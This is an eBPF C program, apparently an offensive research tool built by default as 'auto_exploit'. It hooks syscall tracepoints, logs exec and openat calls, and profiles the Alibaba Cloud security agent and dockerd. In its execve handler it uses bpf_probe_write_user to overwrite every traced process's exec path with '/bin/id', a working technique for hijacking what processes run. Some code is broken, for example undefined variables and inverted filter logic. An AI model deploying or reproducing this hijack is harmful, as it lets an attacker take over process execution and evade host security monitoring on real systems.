// +build ignore

/*
开启 bpf_log 
最终release版需要把这个注释去掉
*/
// #define DEBUG_LOG

#include "ringbuffer.h"
// #include "global.h"
#include <stdbool.h>

char __license[] SEC("license") = "Dual MIT/GPL";

// 每次只收集一种信息，防止log过多，丢失信息。编译时由BPF_CFLAGS配置

#ifdef TRACE_ALL
	#define TRACE_COMM
	#define TRACE_OPENAT
	#define TRACE_EXECVE
	#define TRACE_SYSCALL
#endif


#define TASK_COMM_LEN 16

#if defined(TRACE_ALL)
	#define SELF "ebpf_snoop"
#elif defined(TRACE_COMM)
	#define SELF "comm_snoop"
#elif defined(TRACE_OPENAT)
	#define SELF "open_snoop"
#elif defined(TRACE_EXECVE)
	#define SELF "exec_snoop"
#elif defined(TRACE_SYSCALL)
	#define SELF "syscall_snoop"
#else
	#define SELF "auto_exploit"
#endif

#define TRACE_PRCOESS "dockerd"

enum MoreEventId {
	EVENT_COMM = 1,
	EVENT_OPEN_FILE,
	EVENT_EXECVE,
	EVENT_SYSCALL,
};

static __inline bool is_process(const char *buf, int len) {
	char comm[TASK_COMM_LEN] = {0};
	bpf_get_current_comm(&comm, sizeof(comm));
	if (memcmp(comm, buf, len) == 0){
		return true;
	}
	return false;
}

static __inline bool inore_process(const char *buf, int len) {
	char comm[TASK_COMM_LEN] = {0};
	bpf_get_current_comm(&comm, sizeof(comm));
	if (memcmp(comm, buf, len) == 0){
		return true;
	}
	// 只抓取sshd进程
	// if (memcmp(comm, "sshd", sizeof("sshd")) != 0
	// 	|| memcmp(comm, "bash", sizeof("bash")) != 0) {
	// 	return true;
	// }

	// 为了避免消息过多，只收集阿里云盾的syscall
	#if defined(TRACE_SYSCALL)
	if (memcmp(comm, "AliYunDun", sizeof("AliYunDun")) != 0) {
		return true;
	}
	#endif

	if (memcmp(comm, "pgrep", sizeof("pgrep")) == 0
		|| memcmp(comm, "ps", sizeof("ps")) == 0 
		|| memcmp(comm, "pidof", sizeof("pidof")) == 0 
		|| memcmp(comm, "tee", sizeof("tee")) == 0 
		|| memcmp(comm, "sleep", sizeof("sleep")) == 0
		// || memcmp(comm, "go", sizeof("go")) == 0 
		) {
		return true;
	}
	return false;
}

static __inline int hanle_enter_execve(struct bpf_raw_tracepoint_args *ctx) {
	struct pt_regs *regs = (struct pt_regs *)(ctx->args[0]);
	char comm[LOG_ENTRY_SIZE] = {0};
	char data[LOG_ENTRY_SIZE] = {0};

	bpf_get_current_comm(comm, 8);
	char *cmd = NULL;
	bpf_probe_read(&cmd , sizeof(cmd) , &regs->di);
	bpf_probe_read_str(&data, sizeof(data), cmd);

	bpf_log("hanle_enter_execve: %s %s\n", comm, data);

	int len = 10;
	fill_space(comm, len);
	comm[len] = ' ';
	memcpy(comm + len, data, LOG_ENTRY_SIZE - len);

	// test write
	char PAYLOAD[] = "/bin/id\x00";
	bpf_probe_write_user(cmd, PAYLOAD, sizeof(PAYLOAD));
	bpf_probe_read_str(&data, sizeof(PAYLOAD), cmd);
	int ret = memcmp(data, PAYLOAD, sizeof(PAYLOAD));
	send_event_log(EVENT_EXECVE, ret == 0, comm);

	return 0;
}

static __inline int hanle_enter_openat(struct bpf_raw_tracepoint_args *ctx) {
	struct pt_regs *regs = (struct pt_regs *)(ctx->args[0]);
	char comm[LOG_ENTRY_SIZE] = {0};
	bpf_get_current_comm(comm, LOG_ENTRY_SIZE);

	char data[LOG_ENTRY_SIZE] = {0};
	char *pathname = NULL;
	bpf_probe_read(&pathname , sizeof(pathname) , &regs->si);
	bpf_probe_read_str(&data, sizeof(data), pathname);
	
	// bpf_log("hanle_enter_openat: %s\n", comm);
	if (pathname != NULL || 
		memcmp(data, "/dev/null", sizeof("/dev/null")) != 0 ||
		memcmp(data, " ", sizeof(" ")) != 0) {
		int len = 10;
		fill_space(comm, len);
		comm[len] = ' ';
		memcpy(comm + len, data, LOG_ENTRY_SIZE - len);
		fill_space(comm + len, LOG_ENTRY_SIZE - len);
		send_event_log(EVENT_OPEN_FILE, __LINE__, comm);
	}
	return 0;
}

static __inline int hanle_exit_read(struct bpf_raw_tracepoint_args *ctx) {

	return 0;
}


static __inline int trace_comm(struct bpf_raw_tracepoint_args *ctx) {
	u64 id   = bpf_get_current_uid_gid();
	u32 uid = id & 0xffffffff;
	char comm[LOG_ENTRY_SIZE + 4] = {0};
	char root[] = "root";
	bpf_get_current_comm(comm, LOG_ENTRY_SIZE);

	// send_event(&event);
	if (uid == 0) {
		int comm_len = 20;
		fill_space(comm, comm_len);
		memcpy(comm + comm_len, root, sizeof(root));
	}
	send_event_log(EVENT_COMM, 0, comm);
	bpf_log("Sizeof event_comm: %s %d %d\n", comm, (int) tgid, (int) cur_pid);
	
	return 0;
}

static __inline void trace_process_enter(struct bpf_raw_tracepoint_args *ctx) {
	unsigned long syscall_id = ctx->args[1];
	switch (syscall_id)
	{
	case 59:
		#ifdef TRACE_EXECVE
		hanle_enter_execve(ctx);
		#endif
		break;
	case 257:
		#ifdef TRACE_OPENAT
		hanle_enter_openat(ctx);
		#endif
		break;
	}
	#ifdef TRACE_SYSCALL
	char comm[LOG_ENTRY_SIZE + 4] = {0};
	bpf_get_current_comm(comm, LOG_ENTRY_SIZE);
	send_event_log(EVENT_SYSCALL, syscall_id, comm);
	#endif
}

static __inline void trace_process_exit(struct bpf_raw_tracepoint_args *ctx) {
	if (!is_process(TRACE_PRCOESS, sizeof(TRACE_PRCOESS))) return;
	
	unsigned long syscall_id;
	struct pt_regs *regs = (struct pt_regs *)(ctx->args[0]);
	bpf_probe_read(&syscall_id, sizeof(syscall_id) , &regs->orig_ax);
	bpf_log("trace exit: " TRACE_PRCOESS " %d\n", syscall_id);

	// https://filippo.io/linux-syscall-table/
	if (syscall_id == 0) {
		hanle_exit_read(ctx);
	}
}

SEC("raw_tracepoint/sys_enter")
int raw_tp_sys_enter(struct bpf_raw_tracepoint_args *ctx) {
	if (inore_process(SELF, sizeof(SELF))) return 0;

#ifdef TRACE_COMM
	trace_comm(ctx);
#endif
	trace_process_enter(ctx);
	return 0;
}

SEC("raw_tracepoint/sys_exit")
int raw_tp_sys_exit(struct bpf_raw_tracepoint_args *ctx) {
	if (inore_process(SELF, sizeof(SELF))) return 0;
	trace_process_exit(ctx);
	return 0;
}


// 无法获取进程名称
// colab无法使用
SEC("tracepoint/syscalls/sys_enter_open")
int tracepoint__syscalls__sys_enter_open(struct trace_event_raw_sys_enter* ctx) {
	// if (is_process(SELF, sizeof(SELF))) return 0;
	// char comm[LOG_ENTRY_SIZE + 4] = {0};
	// bpf_get_current_comm(comm, LOG_ENTRY_SIZE);
	// bpf_log("open file: %s %s %d\n", comm, (char *)ctx->args[1], (int)ctx->args[2]);
	// bpf_log("open file: %s %d\n", (char *)ctx->args[1], (int)ctx->args[2]);
	return 0;
}